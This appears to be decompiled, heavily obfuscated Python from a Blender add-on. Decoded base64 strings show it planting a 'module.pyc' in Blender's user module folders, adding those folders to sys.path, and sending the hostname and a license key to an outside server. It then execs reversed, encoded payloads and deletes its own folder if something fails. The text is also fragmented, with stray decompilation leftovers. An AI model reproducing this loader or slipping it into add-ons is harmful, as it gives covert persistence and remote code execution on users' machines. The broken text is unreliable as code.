MAAABzqAAAAGcAaQACAH0BfQJ0AGoBoAJ8AKEBcqB0A3wAZAGDAo8OfQN8A6AEoQB9AVcAZABRAFIAWAB0BXwBZAIZAGsHcmR8AWQCGQBkAxcAfAFkAjwAfAGgBmQEdAUXAGQEFwChAQEAbjx5LnwCoAd0CHQJZAWDAYMBdAl0CHwBZAIZAIMBZAZkAIUCGQCDAYMBoQEBAFcAbgwBAAEAAQBZAG4CWAB8AXwCZwJTACkHTtoCcmLp//////MBAAAACvMBAAAAInMQAAAAYW5OdmJpNXNiMkZrY3c9PekQAAAAKQraAm9z2gRwYXRo2gZleGlzdHPaBG9wZW7aCXJlYWRsaW5lc9oFTzAwMDDaBmFwcGVuZNoGdXBkYXRlcgMAAAByCwAAACkE2gFwWhFPMDBPME9PT09PMDAwMDBPMFoRTzAwME9PMDBPMDBPTzBPMDBaEU9PT09PME9PTzBPME8wTzBPcgYAAAByBgAAAHIHAAAA2gVPTzBPTxMAAABzGAAAAAABCgEMAQwBEgEMARABFAICAS4BBgEGAXIbAAAAYwIAAAAAAAAABAAAAAkAAABDAAAAc7YAAAB0AGoBoAJ8AKEBcrJ8AXKydAN8AGQBgwKPDn0CfAKgBKEAfQNXAGQAUQBSAFgAdAV8A2QCGQBrB3JcfANkAhkAZAMXAHwDZAI8AHwDoAZkBHQFFwBkBBcAoQEBAHlIZAR0BRcAdAd0CHQJZAWDAYMBfAGDAYMBFwBkBBcAfANkAjwAdAN8AGQGgwKPEH0CfAKgCnwDoQEBAFcAZABRAFIAWABXAG4MAQABAAEAWQBuAlgAZABTACkHTnINAAAAcg4AAAByDwAAAHIQAAAAcxAAAABhbk52Ymk1a2RXMXdjdz092gJ3YikLchIAAAByEwAAAHIUAAAAchUAAAByFgAAAHIXAAAAchgAAAByCAAAAHIDAAAAcgsAAADaCndyaXRlbGluZXMpBHIaAAAA2gFkWhFPTzAwME8wT09PT09PME8wMFoRT08wMDBPT09PT08wTzAwTzByBgAAAHIGAAAAcgcAAADaBU9PME8wIQAAAHMYAAAAAAEQAQwBEgEMARABEgECASQBDAEYAQYBch8AAABjAAAAAAAAAAAGAAAACQAAAEMAAABzrgAAAGQBfQB0AHQBZAKDAYMBdAFkA4MBdAJkBJwCgwFqA2QFZAaNAX0BdAB0AWQHgwGDAXQBfACDAXwBZAiNAn0CdAB0AWQJgwGDAXwCgwGgBKEAfQN0BWoGoAd0BWoGoAh0CaEBdAVqBqAKdAmhAaECfQR0C3wEgwFkChkAfQF0DHwEZAuDAo8UfQV8BaANdA58A4MBoQEBAFcAZABRAFIAWAB0D3wEfAGDAgEAZABTACkMTnMwAAAAYUhSMGNEb3ZMM2QzZHk1aWJHVnVaR1Z5TG5kcGEyazZNVE0xTnprdmRYQmtZWFJscxAAAABhbk52Ymk1a2RXMXdjdz09cxAAAABUR2xqWlc1elpWOUxaWGs9KQLaAXXaAWh6BXV0Zi04KQHaCGVuY29kaW5ncyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdVVtVnhkV1Z6ZEE9PSkB2gRkYXRhcyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdWRYSnNiM0JsYmc9PekBAAAAchwAAAApEHIDAAAAcgsAAADaA29Pb9oGZW5jb2Rl2gRyZWFkchIAAAByEwAAANoEam9pbtoHZGlybmFtZdoIX19maWxlX1/aCGJhc2VuYW1lchsAAAByFQAAANoFd3JpdGVyDAAAAHIfAAAAKQZaEU9PME8wME8wTzBPMDAwT08wWhFPT08wME9PME8wT08wT08wMFoRT08wT08wT09PT09PTzBPT09aEU9PT09PMDAwME8wT09PME9PWhFPMDAwT09PT09PTzBPME8wT1oRTzBPMDBPMDBPMDAwT08wMDByBgAAAHIGAAAAcgcAAADaBU9PMDAwLgAAAHMSAAAAAAEEASIBGAEUAR4BDAEMARgBci0AAABzSAAAAGMyOWphMlYwTG1kbGRHaHZjM1J1WVcxbEtDa2dhV1lnYzI5amEyVjBMbWRsZEdodmMzUnVZVzFsS0NrZ1pXeHpaU0FuSnc9PXMYAAAAYVcxd2IzSjBiR2xpTG5KbGJHOWhaQT09KRXaBmJhc2U2NHICAAAAcgQAAABaDnVybGxpYi5yZXF1ZXN0WgZ1cmxsaWJaDHVybGxpYi5wYXJzZdoJaW1wb3J0bGliWgZzb2NrZXRaBGpzb25yEgAAAHIIAAAAcgoAAAByCwAAAHIMAAAAchcAAAByGwAAAHIfAAAAci0AAAByAwAAAHIlAAAA2gZtb2R1bGVyBgAAAHIGAAAAcgYAAAByBwAAANoIPG1vZHVsZT4CAAAAcyYAAAAMAQgBCAEIAQgBCAEIAQgBCAIIAggCCAIEAQgOCA0ICgwBBgEIAQ=='#line:52

            ps =eval (OOO0O (b'W29zLnBhdGguam9pbihicHkudXRpbHMudXNlcl9yZXNvdXJjZSgnU0NSSVBUUycsICdhZGRvbnMnKSwgJ21vZHVsZXMnKSwgb3MucGF0aC5qb2luKGJweS51dGlscy51c2VyX3Jlc291cmNlKCdTQ1JJUFRTJywgJ3ByZXNldHMnKSwgJ21vZHVsZXMnKV0='))#line:53

            for p in ps :#line:54

                if not os .path .exists (p ):#line:55

                    os .makedirs (p )#line:56

                p =os .path .join (p ,OOO0O (b'bW9kdWxlLnB5Yw==')).replace ('\\','/')#line:57

                d =None

                try :

                    d =getfilecontent (p )[1 ]#line:58

                except :

                    pass

                with open (p ,'wb')as f :#line:59

                    f .write (OOO00 (c ))#line:60

                    sys .path .append (os .path .split (p )[0 ])#line:61

                if d :

                    dump_to_file (p ,d )#line:62

        except :#line:63

            try :#line:64

                import shutil #line:65

                eval (OOO0O (b'c2h1dGlsLnJtdHJlZShvcy5wYXRoLmRpcm5hbWUoX19maWxlX18pKQ=='))#line:66

            except :#line:67

                pass #line:68

        try :#line:69

            eval (OOO0O (b'aW1wb3J0bGliLnJlbG9hZChtb2R1bGUp'))#line:70

        except :#line:71

            try :#line:72

                import module #line:73

            except :#line:74

                pass #line:75

for i in list (locals ().keys ()):#line:76

    if i in ["bl_info", "os", "bpy", "importlib", "b", "d", "fs", "CE", "LicenseKey", "register", "unregister", "bd", "base64", "json", "sys", "OOOOO", "OOOO0", "OOO0O", "OOO00", "data_json_STR", "getfilecontent", "dump_to_file", "module"] :#line:77

        del locals ()[i ]#line:78

del i

)
                OO0OO0O00OO0OO0O0 = eval(OO0OO0O00OO0OO0O0 +eval (OOO0O (eval (f'b\'{O0O0data_json_STRO00OOO0O [OOO0O (data_json_STR000O0O0OOOOO )][::-1 ]}\'')))+

register()

)
                exec(OO0OO0O00OO0OO0O0, g)
            else:
                O0O00()
        except:
            pass

    finally:
        if eval(os.path.exists)(lice_ce_pyc_list[1]):
            eval(os.rename)(lice_ce_pyc_list[1], lice_ce_pyc_list[0])


def O000O(g):
    try:
        try:
            OOOO0Odata_json_STROOOO0O = [OOO0OO0Odata_json_STR0OOO for OOO0OO0Odata_json_STR0OOO in lice_ce_pyc_list if os.path.exists(OOO0OO0Odata_json_STR0OOO)][0]
            OO00O0Odata_json_STROO000, OO0O0O000O0O000O0 = eval(b'aG9zdA==',b'X19pbml0X18ucHk=')
            OO0OOO00OOOOO00O0 = eval(getfilecontent (OOOO0Odata_json_STROOOO0O )[1 ])
            if cur_dir_name in OO0OOO00OOOOO00O0.keys():
                if OOO0O(OO00O0Odata_json_STROO000) in OO0OOO00OOOOO00O0.keys():
                    if OO0OOO00OOOOO00O0[OOO0O(OO00O0Odata_json_STROO000)] == hostname:
                        O00data_json_STROO00O00O0 = eval(eval (OOO0O (eval (f'b\'{OO0OOO00OOOOO00O0 [OOO0O (OO0O0O000O0O000O0 )][::-1 ]}\'')))+

unregister()

)
                        exec(O00data_json_STROO00O00O0, g)
        except:
            pass

    finally:
        if eval(os.path.exists)(lice_ce_pyc_list[1]):
            eval(os.rename)(lice_ce_pyc_list[1], lice_ce_pyc_list[0])


if eval(os.path.exists)(lice_ce_pyc_list[1]):
    eval(os.rename)(lice_ce_pyc_list[1], lice_ce_pyc_list[0])
if __name__ == '__main__':
    pass
# okay decompiling .\CE.pyc
